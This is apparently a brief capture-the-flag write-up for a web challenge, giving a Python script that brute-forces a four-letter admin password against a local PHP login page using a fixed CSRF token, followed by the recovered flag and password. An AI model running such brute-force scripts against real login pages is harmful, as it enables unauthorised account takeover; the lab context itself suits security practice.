we brute force the password with python requests.post <br />
python script is <br />
```
import requests
ans=list('abcdefghijklmnopqrstuvwxyz')
url='http://127.0.0.1:8000/web2.php'
for i in range(26):
        for j in range(26):
                for k in range(26):
                        for l in range(26):
                                text=requests.post(url,{'password':ans[l]+ans[k]+ans[j]+ans[i],'user':'admin','csrf':'98737263'})
                                if 'JCTF' in text.text:
                                        print(text.text)
                                        break
```
flag='JCTF{c5rf_15_cr4p}'
password='heda'
